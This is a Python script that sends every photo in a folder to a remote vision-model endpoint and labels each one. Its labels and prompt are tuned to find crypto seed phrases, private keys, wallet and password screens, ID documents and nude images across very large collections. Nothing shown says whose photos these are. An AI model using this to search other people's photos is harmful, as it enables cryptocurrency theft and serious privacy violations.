#!/usr/bin/env python3
"""Resumable batch photo classifier for a Qwen3.5-4B (vLLM) endpoint.

    classify.py --root /photos --concurrency 64 [--pilot 200] [--force]
                [--retry-failed] [--base-url URL] [--model ID] [--out results.jsonl]

One image per chat completion.  EXIF-corrected, RGB, long edge <= 448 px, JPEG
in memory.  One label from a fixed taxonomy per photo (or "unknown").

The API key is read from VISION_API_KEY, or VLLM_API_KEY when the endpoint is
local (inside the Pod).  It is never written to source, logs, CSV or filenames.

Resumable: results.jsonl is appended and fsynced; a rerun skips status="ok".
A single-writer lock makes two concurrent runs impossible.

Memory: decoding a 48 MP HEIC needs ~150 MB of RGB, so decodes are bounded by a
semaphore (--decode-workers, default 8) while HTTP keeps the full concurrency.
A cached 640 px thumbnail (Scan/thumbs/<rel>.jpg) is preferred over the original
when present: same label, a fraction of the CPU.
"""
from __future__ import annotations

import argparse
import base64
import csv
import fcntl
import io
import json
import os
import random
import sys
import threading
import time
from pathlib import Path

import requests
from PIL import Image, ImageFile, ImageOps

try:  # iPhone photos / avif
    from pillow_heif import register_heif_opener

    register_heif_opener()
except Exception:  # noqa: BLE001
    pass

ImageFile.LOAD_TRUNCATED_IMAGES = True
Image.MAX_IMAGE_PIXELS = 500_000_000

LABELS = (
    "seed", "seed-candidate", "privatekey", "wallet", "recover", "exchange",
    "ledger", "trezor", "safe", "backup", "password", "account", "crypto",
    "screenshot", "text", "document", "receipt", "nude", "selfie", "person",
    "photo", "meme", "other", "unknown",
)
LABEL_SET = set(LABELS)

# The model sometimes answers a fine-grained noun that is not in the taxonomy
# ("logo", "food", "signature").  Map the common ones onto the nearest allowed
# label instead of throwing the photo away as invalid_label.
FALLBACK = {
    "logo": "screenshot", "icon": "screenshot", "chart": "screenshot",
    "graph": "screenshot", "map": "screenshot", "diagram": "screenshot",
    "ui": "screenshot", "app": "screenshot", "website": "screenshot",
    "food": "photo", "meal": "photo", "animal": "photo", "landscape": "photo",
    "car": "photo", "object": "photo", "room": "photo", "pet": "photo",
    "signature": "text", "handwriting": "text", "note": "text", "list": "text",
    "menu": "text", "article": "text", "book": "text", "letter": "text",
    "ticket": "receipt", "invoice": "receipt", "bill": "receipt",
    "form": "document", "contract": "document", "id": "document",
    "card": "document", "passport": "document", "certificate": "document",
    "video": "screenshot", "screen": "screenshot", "recording": "screenshot",
    "phrase": "seed-candidate", "words": "seed-candidate", "seedphrase": "seed-candidate",
    "key": "privatekey", "qr": "privatekey", "qrcode": "privatekey",
}
MAX_TOKENS = 16  # "seed-candidate" is the longest label

PROMPT = (
    "Label this photo with exactly one of these labels:\n"
    + ", ".join(LABELS)
    + "\nRules: a numbered or column list of lowercase English words is seed "
    "(all readable) or seed-candidate (partly readable) - never text. "
    "A wallet balance/address screen is wallet, not crypto. "
    "\"Enter your recovery phrase\" is recover, but seed when the words are visible. "
    "Prefer the most specific label, then crypto/screenshot/photo, then other/unknown.\n"
    "Answer with the label only, no punctuation.\nLabel:"
)

IMAGE_EXT = {
    ".jpg", ".jpeg", ".png", ".webp", ".avif", ".heic", ".heif", ".tif", ".tiff",
    ".bmp", ".gif", ".dng", ".nef", ".cr2", ".cr3", ".arw", ".orf", ".rw2", ".raf",
}

# One decode at a time costs ~35 MB (12 MP) to ~150 MB (48 MP) of RGB.
_DECODE = threading.BoundedSemaphore(max(1, int(os.environ.get("CLASSIFY_DECODE", "8"))))
_TLS = threading.local()


def log(message: str) -> None:
    print(f"{time.strftime('%H:%M:%S')} {message}", flush=True)


def api_key(base_url: str) -> str:
    key = os.environ.get("VISION_API_KEY") or ""
    if not key and ("127.0.0.1" in base_url or "localhost" in base_url):
        key = os.environ.get("VLLM_API_KEY") or ""
    return key


def jpeg_b64(path: Path, side: int = 448, quality: int = 88) -> str:
    with _DECODE:
        with Image.open(path) as image:
            # JPEG can decode straight to 1/2, 1/4 or 1/8 scale: a 12 MP photo
            # becomes ~0.2 MP and a few MB instead of 36 MB.
            if (image.format or "").upper() == "JPEG":
                try:
                    image.draft("RGB", (side, side))
                except Exception:  # noqa: BLE001
                    pass
            upright = ImageOps.exif_transpose(image) or image
            upright = upright.convert("RGB")
            upright.thumbnail((side, side))
            buffer = io.BytesIO()
            upright.save(buffer, "JPEG", quality=quality, optimize=True)
    return base64.b64encode(buffer.getvalue()).decode()


def thumb_of(root: Path, path: Path) -> Path | None:
    """The cached 640 px thumbnail for `path`, when one was already built."""
    try:
        rel = path.relative_to(root).as_posix()
    except ValueError:
        return None
    candidate = root / "Scan" / "thumbs" / f"{rel}.jpg"
    try:
        if candidate.is_file() and candidate.stat().st_size > 0:
            return candidate
    except OSError:
        return None
    return None


def walk(root: Path) -> list[Path]:
    files = []
    for base, dirs, names in os.walk(root):
        dirs[:] = sorted(d for d in dirs if d not in ("Scan", "Thumbs", ".thumbnails"))
        for name in names:
            if name.endswith((".part", ".tmp")):
                continue
            if Path(name).suffix.lower() not in IMAGE_EXT:
                continue
            files.append(Path(base) / name)
    files.sort()
    return files


class Classifier:
    def __init__(self, base_url: str, model: str, timeout: int = 60, concurrency: int = 8):
        self.base_url = base_url.rstrip("/")
        self.model = model
        self.timeout = timeout
        self.concurrency = concurrency
        self.key = api_key(self.base_url)

    def session(self) -> requests.Session:
        """One session (its own connection pool) per worker thread."""
        session = getattr(_TLS, "session", None)
        if session is None:
            session = requests.Session()
            adapter = requests.adapters.HTTPAdapter(
                pool_connections=4, pool_maxsize=4, max_retries=0
            )
            session.mount("https://", adapter)
            session.mount("http://", adapter)
            session.headers.update({"content-type": "application/json"})
            if self.key:
                session.headers["authorization"] = f"Bearer {self.key}"
            _TLS.session = session
        return session

    def _ask(self, payload: dict) -> str:
        response = self.session().post(
            f"{self.base_url}/chat/completions", json=payload, timeout=self.timeout
        )
        if response.status_code == 429 or 500 <= response.status_code < 600:
            raise Transient(f"http:{response.status_code}")
        if response.status_code == 400:
            raise Fatal("http:400")
        response.raise_for_status()
        text = (response.json()["choices"][0]["message"]["content"] or "").strip()
        return text.split()[0].strip(".,:;\"'`*").lower() if text else ""

    def classify(self, rel_path: str, path: Path, prompt: str | None = None) -> dict:
        started = time.time()
        source = path
        try:
            b64 = jpeg_b64(path)
        except Exception as error:  # noqa: BLE001
            parent = path.parent
            # A broken cached thumb must not lose the photo: retry the original.
            if parent.name == "thumbs" or "Scan/thumbs" in path.as_posix():
                alt = Path(str(path).replace(f"{os.sep}Scan{os.sep}thumbs", ""))
                alt = alt.with_suffix("") if alt.suffix.lower() == ".jpg" else alt
                try:
                    b64 = jpeg_b64(alt)
                    source = alt
                except Exception:  # noqa: BLE001
                    return self._row(rel_path, "", "error", f"prepare:{type(error).__name__}", started)
            else:
                return self._row(rel_path, "", "error", f"prepare:{type(error).__name__}", started)

        payload = {
            "model": self.model,
            "temperature": 0,
            "max_tokens": MAX_TOKENS,
            "chat_template_kwargs": {"enable_thinking": False},
            "messages": [
                {
                    "role": "user",
                    "content": [
                        {"type": "text", "text": prompt or PROMPT},
                        {"type": "image_url", "image_url": {"url": "data:image/jpeg;base64," + b64}},
                    ],
                }
            ],
        }

        last = ""
        for attempt in range(5):
            try:
                word = self._ask(payload)
                if word in LABEL_SET:
                    return self._row(rel_path, word, "ok", "", started, source)
                mapped = FALLBACK.get(word)
                if mapped:
                    return self._row(rel_path, mapped, "ok", "", started, source)
                # one retry with the same image when the answer is not a label
                if attempt == 0:
                    last = f"label:{word[:24]}"
                    continue
                return self._row(rel_path, word, "invalid_label", last or "not a label", started, source)
            except Fatal as error:
                return self._row(rel_path, "", "error", str(error), started, source)
            except Transient as error:
                last = str(error)
                time.sleep(min(8.0, 0.5 * 2 ** attempt) + random.random() * 0.3)
            except requests.exceptions.Timeout:
                last = "timeout"
                time.sleep(min(8.0, 0.5 * 2 ** attempt))
            except Exception as error:  # noqa: BLE001
                last = f"{type(error).__name__}"
                time.sleep(min(8.0, 0.5 * 2 ** attempt))
        return self._row(rel_path, "", "error", last, started, source)

    def _row(self, rel_path, label, status, error, started, source=None) -> dict:
        row = {
            "rel_path": rel_path,
            "label": label,
            "status": status,
            "error": error,
            "ms": int((time.time() - started) * 1000),
            "model": self.model,
        }
        if source is not None:
            row["src"] = source.name
        return row


class Transient(Exception):
    """429 / 5xx / timeout: worth another try."""


class Fatal(Exception):
    """400: the payload is wrong, retrying cannot help."""


def load_results(path: Path) -> dict[str, dict]:
    done: dict[str, dict] = {}
    if not path.exists():
        return done
    with path.open(errors="ignore") as handle:
        for line in handle:
            try:
                row = json.loads(line)
            except Exception:  # noqa: BLE001
                continue
            if row.get("rel_path"):
                done[row["rel_path"]] = row
    return done


def percentile(values: list[int], fraction: float) -> int:
    if not values:
        return 0
    ordered = sorted(values)
    index = min(len(ordered) - 1, int(round(fraction * (len(ordered) - 1))))
    return ordered[index]


def run_pool(classifier: Classifier, items: list[tuple[str, Path]], workers: int,
             on_result=None, progress=None) -> tuple[dict, list[dict]]:
    """Classify `items` with `workers` threads; return (stats, results).

    A pull queue keeps memory flat: no futures are created up front, so a
    1.2 M photo run costs the same as a 200 photo run.
    """
    lock = threading.Lock()
    cursor = 0
    latencies: list[int] = []
    ok = 0
    failures = 0
    rows: list[dict] = []
    started = time.time()

    def worker() -> None:
        nonlocal cursor, ok, failures
        while True:
            with lock:
                if cursor >= len(items):
                    return
                rel, path = items[cursor]
                cursor += 1
            result = classifier.classify(rel, path)
            with lock:
                rows.append(result)
                latencies.append(result["ms"])
                if result["status"] == "ok":
                    ok += 1
                else:
                    failures += 1
                if on_result is not None:
                    on_result(result)
                if progress is not None:
                    progress(ok, failures, len(rows), len(items), started)

    threads = [threading.Thread(target=worker, daemon=True) for _ in range(max(1, workers))]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

    elapsed = max(0.001, time.time() - started)
    stats = {
        "concurrency": workers,
        "photos": len(items),
        "elapsed": round(elapsed, 2),
        "labels_per_sec": round(ok / elapsed, 2),
        "p50_ms": percentile(latencies, 0.50),
        "p95_ms": percentile(latencies, 0.95),
        "failures": failures,
    }
    return stats, rows


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--root", default=os.environ.get("PHOTO_FOLDER", ""))
    parser.add_argument("--concurrency", type=int, default=64)
    parser.add_argument("--pilot", type=int, default=200)
    parser.add_argument("--force", action="store_true")
    parser.add_argument("--retry-failed", action="store_true")
    parser.add_argument("--base-url", default=os.environ.get("VISION_BASE_URL",
                        "https://e1fbo6zesvurm4-8000.proxy.runpod.net/v1"))
    parser.add_argument("--model", default=os.environ.get("VISION_MODEL", "Qwen/Qwen3.5-4B"))
    parser.add_argument("--out", default="results.jsonl")
    parser.add_argument("--csv", default="")
    parser.add_argument("--summary", default="summary.json")
    parser.add_argument("--limit", type=int, default=0)
    parser.add_argument("--decode-workers", type=int,
                        default=int(os.environ.get("CLASSIFY_DECODE", "8")))
    parser.add_argument("--save-every", type=int, default=50)
    parser.add_argument("--timeout", type=int, default=60)
    parser.add_argument("--no-thumbs", action="store_true",
                        help="always decode the original, ignore Scan/thumbs")
    parser.add_argument("--skip-pilot", action="store_true")
    args = parser.parse_args()

    if not args.root:
        parser.error("--root (or PHOTO_FOLDER) is required")
    root = Path(args.root).expanduser().resolve()
    if not root.is_dir():
        parser.error(f"not a folder: {root}")

    global _DECODE
    _DECODE = threading.BoundedSemaphore(max(1, args.decode_workers))

    out = Path(args.out) if os.path.isabs(args.out) else root / args.out
    out.parent.mkdir(parents=True, exist_ok=True)
    csv_path = Path(args.csv) if args.csv else out.with_suffix(".csv")
    summary_path = Path(args.summary) if os.path.isabs(args.summary) else root / args.summary

    # Single writer: two runs can never classify the same photo twice.
    lock_handle = out.with_suffix(".lock").open("w")
    try:
        fcntl.flock(lock_handle, fcntl.LOCK_EX | fcntl.LOCK_NB)
    except OSError:
        parser.error(f"another run holds {out.with_suffix('.lock')}")

    done = load_results(out)
    files = walk(root)
    if args.limit:
        files = files[: args.limit]
    todo: list[tuple[str, Path]] = []
    for path in files:
        rel = path.relative_to(root).as_posix()
        row = done.get(rel)
        if row and not args.force:
            if row.get("status") == "ok":
                continue
            if not args.retry_failed:
                continue
        source = path if args.no_thumbs else (thumb_of(root, path) or path)
        todo.append((rel, source))

    known = len(files) - len(todo)
    log(f"{len(files)} photos · {known} already done · {len(todo)} to classify")
    if not todo:
        log("nothing to do")
        return

    classifier = Classifier(args.base_url, args.model, timeout=args.timeout)
    if not classifier.key:
        log("warning: no VISION_API_KEY / VLLM_API_KEY in the environment (anonymous)")

    public = "127.0.0.1" not in args.base_url and "localhost" not in args.base_url
    concurrency = max(1, min(128, args.concurrency))

    handle = out.open("a", buffering=1)
    written = 0
    counts: dict[str, int] = {}
    totals = {"ok": 0, "failed": 0, "invalid": 0}

    def record(result: dict) -> None:
        nonlocal written
        handle.write(json.dumps(result) + "\n")
        written += 1
        if result["status"] == "ok":
            totals["ok"] += 1
            counts[result["label"]] = counts.get(result["label"], 0) + 1
        elif result["status"] == "invalid_label":
            totals["invalid"] += 1
        else:
            totals["failed"] += 1
        if written % args.save_every == 0:
            handle.flush()
            os.fsync(handle.fileno())

    def progress(done_now: int, failures: int, index: int, total: int, started: float) -> None:
        if index % 200 and index != total:
            return
        elapsed = max(0.001, time.time() - started)
        rate = index / elapsed
        eta = (total - index) / rate if rate else 0
        log(f"{index}/{total} · {rate:.1f}/s · ETA {int(eta // 60)}m{int(eta % 60):02d}s · "
            f"failures {failures} · concurrency {concurrency}")

    started = time.time()
    try:
        # Pilot: 200 photos at 64, then the same 200 at 128 on the public
        # endpoint; keep the faster setting that had no failures.
        if not args.skip_pilot and args.pilot > 0 and len(todo) > args.pilot:
            sample, rest = todo[: args.pilot], todo[args.pilot:]
            first, first_rows = run_pool(classifier, sample, min(64, concurrency))
            log(f"[pilot 64] {first['photos']} photos in {first['elapsed']}s · "
                f"{first['labels_per_sec']} labels/s · p50 {first['p50_ms']} ms · "
                f"p95 {first['p95_ms']} ms · failures {first['failures']}")
            best, best_rows = first, first_rows
            if public:
                second, second_rows = run_pool(classifier, sample, 128)
                log(f"[pilot 128] {second['photos']} photos in {second['elapsed']}s · "
                    f"{second['labels_per_sec']} labels/s · p50 {second['p50_ms']} ms · "
                    f"p95 {second['p95_ms']} ms · failures {second['failures']}")
                if (second["failures"], -second["labels_per_sec"]) < (first["failures"], -first["labels_per_sec"]):
                    best, best_rows = second, second_rows
            # Write the winning pass once, so a rerun sees those photos as done.
            for row in best_rows:
                record(row)
            concurrency = best["concurrency"]
            log(f"pilot winner: {concurrency} concurrent ({best['labels_per_sec']} labels/s) · "
                f"{len(best_rows)} rows written")
            todo = rest

        log(f"bulk: {len(todo)} photos · concurrency {concurrency}")
        stats, _ = run_pool(classifier, todo, concurrency, on_result=record, progress=progress)
        log(f"bulk done in {stats['elapsed']}s · {stats['labels_per_sec']} labels/s · "
            f"failures {stats['failures']}")
    finally:
        handle.flush()
        os.fsync(handle.fileno())
        handle.close()

    rows = load_results(out)

    with csv_path.open("w", newline="") as handle_csv:
        writer = csv.writer(handle_csv)
        writer.writerow(["rel_path", "label", "status", "error"])
        for path in files:
            rel = path.relative_to(root).as_posix()
            row = rows.get(rel) or {}
            writer.writerow([rel, row.get("label", ""), row.get("status", "missing"),
                             row.get("error", "")])

    summary = {
        "root": str(root),
        "model": args.model,
        "total": len(files),
        "classified": len(rows),
        "ok": sum(1 for r in rows.values() if r.get("status") == "ok"),
        "invalid_label": sum(1 for r in rows.values() if r.get("status") == "invalid_label"),
        "failed": sum(1 for r in rows.values() if r.get("status") == "error"),
        "elapsed": round(time.time() - started, 1),
        "concurrency": concurrency,
        "labels": dict(sorted(counts.items(), key=lambda item: -item[1])),
    }
    summary_path.write_text(json.dumps(summary, indent=1))
    log(f"done · {summary['ok']} ok · {summary['failed']} failed · csv {csv_path}")


if __name__ == "__main__":
    main()
